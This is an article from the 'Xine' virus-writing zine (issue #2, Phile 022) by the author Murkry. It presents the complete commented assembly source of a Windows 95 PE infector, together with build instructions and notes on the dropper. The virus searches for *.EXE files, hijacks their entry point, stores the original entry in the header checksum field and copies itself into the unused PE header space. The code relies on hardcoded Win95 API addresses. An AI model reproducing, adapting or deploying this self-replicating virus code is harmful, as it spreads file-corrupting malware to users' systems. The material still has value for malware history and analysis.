   ;                                        /-----------------------------\
   ;                                        | Xine - issue #2 - Phile 022 |
   ;                                        \-----------------------------/

   ;
   ;   PE header section  Infector
   ;    by Murkry another first
   ;

   ;This virus is based on the idea that the unused space in a PE header was
   ;still loaded into memory.  This area differs but averages around 400 bytes
   ;This seemed like enough room and if you use the trick of hardcoding the
   ;address of the API's, well it works.  Though I found that the files that
   ;had the PE header at 80 had enough space but the dead area went over the
   ;200 bytes segment so I need to enlarge the area that was loaded into memory
   ; I did this by increasing the header size by 200 I do not use all this space
   ;but need it for the virus is about 400 bytes. Anyway this a basicly useless
   ;virus since if any of the win api's are moved blam its dead. But it does
   ;demostrate some ideas like moving the entry point above the code section
   ;works fine actauly if the MZ area was bigger the whole thing could be
   ;written there. Ah forget it some other Virii genius will make PE infectors
   ;which are twice as small but till then ...
   ;Murkry


   ;Simple Section Infector PE Win95 virus
   ;does not expand or add a section simple uses the unused space in the
   ;header. ok,
   ;to compile make a batch file with these commands {without the ;}
   ; tasm32 /ml /m3 host1,,;
   ; tlink32 /Tpe /aa /c host1,host1,, import32.lib
   ;
   ; then you need to put 118F in the checksum of course if you modify it
   ; then you need to put that rva for HERE in that checksum

   ;need to set the checksum to 8f 11 00 00 (offset 58 in the PE header)
   ;checksum is used to hold the old entry point

   ;will not reinfect file cause of check of the entry point if this entry point
   ; is 1000 or greater Header has not  infected the file
   ;since the Header infected file will be less than this 260 or 270 entry point

   ;*** note if you execute the virus in the header95.exe file which is a
   ;compiled dropper you mite want to rename it due to the way the virus infects
   ;it will infect itself and only work once, so rename it to *.com so it will
   ;not infect itself. And you can use it over and over
   ;

   .386
   .model flat

   ;Definitions for the virus



   MAX_PATH        EQU     255H       ;maximum path length in Win 95/NT
   OPEN_EXISTING   EQU     3          ;flag for CreateFile to open existing file
   GENERIC_READ    EQU     80000000H  ;flags for CreateFile
   GENERIC_WRITE   EQU     40000000H
   FATTR_NORMAL    EQU     0          ;normal file attribute for CreateFile

   PE_SIZE         EQU     248           ;size of PE file header
   SEC_SIZE        EQU     40            ;size of a section header

   ;Stack frame definitions:
   SRCH_HANDLE     EQU     0             ;handle for file search functions
   TEMP            EQU     SRCH_HANDLE+4 ;temporary storage location
   FHANDLE         EQU     TEMP+4        ;handle for file open/read/write/close
   IOBYTES         EQU     FHANDLE+4
   FIND_DATA       EQU     IOBYTES+4     ;file search data structure
   ;typedef struct _WIN32_FIND_DATA {
   ;   DWORD dwFileAttributes;
   ;   FILETIME ftCreationTime;            ;DD ?,?
   ;   FILETIME ftLastAccessTime;          ;DD ?,?
   ;   FILETIME ftLastWriteTime;           ;DD ?,?
   ;   DWORD nFileSizeHigh;
   ;   DWORD nFileSizeLow;
   ;   DWORD dwReserved0;
   ;   DWORD dwReserved1;
   ;   CHAR cFileName[MAX_PATH];
   ;   CHAR cAlternateFileName[ 14 ];
   ;} WIN32_FIND_DATA
   FILEBUF         EQU     FIND_DATA+11*4+14+MAX_PATH
   TEMP1           EQU     FILEBUF+1024
   WORKSP          EQU     TEMP1 + 4




   ;Define the needed external functions and constants here.

   extrn           ExitProcess:PROC


   .data                                   ;the data area
   dummy           dd      ?               ;just so tasm will compile it

   .code                                   ;executable code starts here

   HOST:
   virus:

   ; ALL WIN95 THAT i HAVE SEEN START WITH EAX = EIP
   ; THIS IS JUSTING USEING THIS METHOD INSTEAD OF THE STANDARD CALL POP SUB...

           PUSH    EAX
           XCHG    EAX,EDI                 ;EDI = THE OFFSET OF HOST

           push    ebp
           sub     esp,WORKSP
           mov     ebp,esp

           lea     EAX,[ebp + FIND_DATA]   ;A PLACE TO FOR WIN95 TO PUT THE
           push    eax                     ;FINDDATA STRUCTURE INFO


           lea     eax,[edi + offset FILE_EXE - offset HOST]
           push    eax                        ;FILE WE ARE LOOKING FOR


           lea     eax,[edi + offset FindFirstFileA - offset HOST]
           call    [eax]                      ;THE CALL TO THE FIND FIRST


           cmp     eax, -1                    ;IF THIS THEN NO FILES TO FIND
           je      exit
           mov     [ebp + SRCH_HANDLE], eax   ;STORE THE HANDLE

   GoForIt:
           call    TryTo                      ;TRY TO INFECT IT

           lea     eax,[ebp + FIND_DATA]      ;TRY TO FIND SECOND FILE
           push    eax

           mov     eax,[ebp + SRCH_HANDLE]
           push    eax


           lea     eax,[edi + offset FindNextFileA - offset HOST]
           call    [eax]


   FSecond:

           or      eax,eax                 ;IF NO ZERO IT FOUND SOMETHING
           jne     GoForIt


   exit:
           add     esp,WORKSP              ;ALL DONE EXIT
           pop     EBP                     ;RESTORE THE STACK



           mov     eax,edi
           xor     ax,ax

           push    eax
           add     eax,3ch
           xchg    eax,esi
           mov     ebx,[esi]
           pop     eax

           add     eax,ebx
           xchg    eax,esi
           push    esi
           pop     ax
           mov     eax,[esi + 58h]
           push    ax                              ;return to host
           RET                                     ;has added benefit
                                                   ;of eax = eip on startup
                                                   ;like win95 does anyway
   ;------------------------------------------------------------------------

   TryTo:

           xor     eax,eax                  ;OPEN THE FILE
           push    eax eax                  ;

           push    LARGE OPEN_EXISTING

           PUSH    EAX EAX

           PUSH    LARGE GENERIC_READ or GENERIC_WRITE

           LEA     EAX,[EBP+FIND_DATA + 2CH] ;LOC OF THE FILENAME
           PUSH    EAX


           lea     eax,[edi + offset CreateFileA - offset HOST]
           call    [eax]


   TRYTO_RET:
           CMP     EAX,-1                  ;NO GOOD
           JNE     HeyALiveOne             ;HEY ITS OPEN
           ret

   ;******************************************

   HeyALiveOne:
           mov     [ebp + FHANDLE],EAX      ;SAVE THE HANDLE

           MOV     esi,FILEBUF              ;GET READY TO READ THE FILE

           XOR     ECX,ECX                  ;READ 400H BYTES
           MOV     CH,4                     ;

           LEA     EDX,[EBP+ESI]            ;INTO THE BUFFER

           CALL    FILE_READ
           Jz      ERROR


           mov     ax,[ebp + esi + 3ch]    ;ok we got a file check for
           cwde                            ;location of the PE header


           MOV     [EBP + TEMP1],EAX
           add     esi,eax                 ;get it and make esi new refrence
           mov     eax,[ebp + esi]         ;point

           cmp     ax,'EP'                 ;is it the PE
           jne     ERROR                   ;

           MOV     EAX,[EBP + ESI + 028H]  ;GET THE ORGINAL ENTRYPOINT
           CMP     EAX, 0900H
           JL      ERROR

           MOV     [EBP + ESI +  58H],EAX  ;SAVE THIS in the checksum

           MOV     AX, WORD PTR [EBP+ESI+6]        ;
           cwde                                    ;MAKES AX INTO EAX

           mov     ecx,28h                         ;SIZE OF THE SECTION HEADER
           mul     ecx                             ;ENTRY
           add     eax,[EBP + TEMP1]               ;
           add     eax,0f8h                        ;
           cmp     eax,268h                        ;COMMON FOR win95 exe
           jle     ms_hder

           cmp     DWORD PTR [EBP + TEMP1],0100H   ;
           jne     ERROR

           cmp     eax,2c0H                        ;
           jne     ERROR

           push    eax
           POP     ECX
           mov     eax,[ebp + esi + 54H]           ;SIZE OF HEADER
           cmp     eax,0400H
           jne     ERROR

           add     ax,200h
           mov     [ebp + esi + 54H],eax
           jmp     borland

   ms_hder:
           mov     ecx,270h                ;amount to write to

   borland:
           MOV     [EBP + ESI + 028H],ECX  ;SET THE VIRUS ENTRYPOINT
           lea     edx,[Ebp + FILEBUF]     ;buffer to write from
           xor     eax,eax                 ;startting at this file position
           call    SEEKWrite

           mov     ecx,VSize               ;amount to write
           mov     edx,edi                 ;write from virus start
           jmp     FILE_WRITE


   ERROR:
           POP     EAX                     ;WHERE WE ARE TO RETURN TO
           PUSH    DWORD PTR [EBP + FHANDLE]
           PUSH    EAX                     ;WHERE WE ARE TO RETURN TO

           mov     eax,[edi + offset _lclose - offset HOST]
           push    eax
           ret

   ;-------------------------------------------------------------------------
   SEEKWrite:
           push    ecx             ;amount to write
           push    edx             ;where to write from

           push    LARGE 0         ;file begin method

           push    LARGE 0         ;high dword of offset into file

           push    eax             ;low  dword of offset into file

           push    dword ptr [ebp+FHANDLE]


           lea     eax,[edi + offset SetFilePointer - offset HOST]
           call    [eax]


   fileret:
           pop     edx             ; where to write from
           pop     ecx             ; amount to write

   FILE_WRITE:

            LEA    EAX,[ EDI+4 ]
            JMP    FRI




   ;--------------------------------------------------------------------------
   FILE_READ:

           MOV     EAX,EDI

   FRI:
           mov     ebx, offset ReadFile - offset HOST
           add     ebx,EAX

           PUSH    LARGE   0

           LEA     EAX,[EBP + IOBYTES]
           PUSH    EAX                     ;ADDRESS OF THE BYTES TO READ

           PUSH    ECX                     ;AMOUNT TO READ 400H
           PUSH    EDX                     ;BUFFER

           PUSH    DWORD PTR [ EBP + FHANDLE]      ;FILE HANDLE

           call    dword ptr [ebx]

   FILE_READ_RET:
           OR      EAX,EAX
           RET

   ;call            FindFirstFileA       0BFF77893H
   ;call            FindNextFileA        0BFF778CBH
   ;call            CreateFileA          0BFF77817H
   ;call            _lclose              0BFF980CFH
   ;call            SetFilePointer       0BFF76FA0H
   ;call            ExitProcess          0BFF8AFB0H
   ;call            ReadFile             0BFF75806H
   ;call            WriteFile            0BFF7580DH


   FILE_EXE        DB      '*.EXE',0

   ;SAD BUT TRUE THESE ARE ALL HARD CODED ;(

   FindFirstFileA  Dd     0BFF77893H
   FindNextFileA   Dd     0BFF778CBH
   CreateFileA     Dd     0BFF77817H
   _lclose         Dd     0BFF980CFH
   SetFilePointer  Dd     0BFF76FA0H
   ReadFile        Dd     0BFF75806H
   WriteFile       Dd     0BFF7580DH

   cpyrite         dB     'Murkry'
   VSize           equ     $ - offset virus


   here:
           push    LARGE -1
           call    ExitProcess             ;Dummy host does nothing but end
                                           ;like int 20 in Dos
           end     HOST
